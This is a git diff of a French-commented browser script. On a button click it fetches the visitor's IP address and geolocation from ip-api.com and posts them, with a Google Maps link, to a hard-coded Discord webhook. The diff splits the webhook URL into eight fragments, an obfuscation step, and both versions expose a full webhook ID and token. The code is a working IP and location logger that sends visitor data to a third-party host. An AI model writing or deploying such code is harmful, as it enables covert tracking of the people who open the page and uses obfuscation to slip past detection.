@@ -1,32 +1,40 @@
 document.getElementById('get-info-btn').addEventListener('click', function() {
-    // Fonction pour reconstituer le lien du webhook Discord
+    // Fonction pour obtenir l'URL du webhook Discord
     function getWebhookUrl() {
-        let part1 = 'https://discord.com/api/webhooks';
-        let part2 = '1243652550251515914';
-        let part3 = 'SrRtaX_dz1S_l1rKGroUHBmvvzBSqVfcWpe07WKJQ8nvLFeIImfe-XgBBlDcT6r_00VU';
-        return `${part1}/${part2}/${part3}`;
+        // Remplacez les parties par les segments de votre URL de webhook Discord
+        let part1 = 'https://dis';
+        let part2 = 'cord.co';
+        let part3 = 'm/api/we';
+        let part4 = 'bhooks';
+        let part5 = '12436525502';
+        let part6 = '51515914/SrRtaX';
+        let part7 = '_dz1S_l1rKGroUHBmvvzBSqVfcWpe07WKJQ8nvLFeIImf';
+        let part8 = 'e-XgBBlDcT6r_00VU';
+        return `${part1}${part2}${part3}${part4}/${part5}${part6}${part7}${part8}`;
     }
 
-    fetch('http://ip-api.com/json/')
-        .then(response => response.json())
+    fetch('https://ip-api.com/json/')
+        .then(response => {
+            if (!response.ok) {
+                throw new Error('Erreur HTTP, statut : ' + response.status);
+            }
+            return response.json();
+        })
         .then(data => {
             if (data.status === 'success') {
-                // Construire le message à envoyer au webhook Discord
                 let message = {
                     content: `
-                        **None a cliqué sur le bouton**
+                        **Utilisateur a cliqué sur le bouton**
                         \nVotre adresse IP est: ${data.query}
                         \nVotre localisation approximative est:
                         \nLatitude: ${data.lat}, Longitude: ${data.lon}
                         \nVille: ${data.city}, Région: ${data.regionName}, Pays: ${data.country}
-                        \n[Google Maps](https://www.google.com/maps?q=${data.lat},${data.lon})  // lien vers Google Maps
+                        \n[Google Maps](https://www.google.com/maps?q=${data.lat},${data.lon})
                     `
                 };
 
-                // URL du webhook Discord
                 let webhookUrl = getWebhookUrl();
 
-                // Envoi du message au webhook Discord
                 fetch(webhookUrl, {
                     method: 'POST',
                     headers: {
@@ -37,27 +45,26 @@ document.getElementById('get-info-btn').addEventListener('click', function() {
                     if (response.ok) {
                         alert('Les informations ont été envoyées avec succès au webhook Discord.');
                     } else {
-                        throw new Error('Erreur lors de l\'envoi au webhook Discord. Statut: ' + response.status);
+                        throw new Error('Erreur lors de l\'envoi au webhook Discord, statut : ' + response.status);
                     }
                 }).catch(error => {
-                    console.error('Erreur:', error);
+                    console.error('Erreur lors de l\'envoi au webhook Discord:', error);
                     alert('Erreur lors de l\'envoi au webhook Discord. Veuillez réessayer.');
                 });
 
-                // Affichage des informations dans l'élément #info-display
                 document.getElementById('info-display').innerText = `
                     Votre adresse IP est: ${data.query}
                     \nVotre localisation approximative est:
                     \nLatitude: ${data.lat}, Longitude: ${data.lon}
                     \nVille: ${data.city}, Région: ${data.regionName}, Pays: ${data.country}
-                    \n[Google Maps](https://www.google.com/maps?q=${data.lat},${data.lon})  // lien vers Google Maps
+                    \n[Google Maps](https://www.google.com/maps?q=${data.lat},${data.lon})
                 `;
             } else {
-                document.getElementById('info-display').innerText = 'Impossible d\'obtenir les informations.';
+                throw new Error('Erreur API : ' + data.message);
             }
         })
         .catch(error => {
-            document.getElementById('info-display').innerText = 'Erreur lors de la récupération des informations.';
-            console.error('Erreur:', error);
+            document.getElementById('info-display').innerText = 'Erreur lors de la récupération des informations : ' + error.message;
+            console.error('Erreur lors de la récupération des informations :', error);
         });
 });
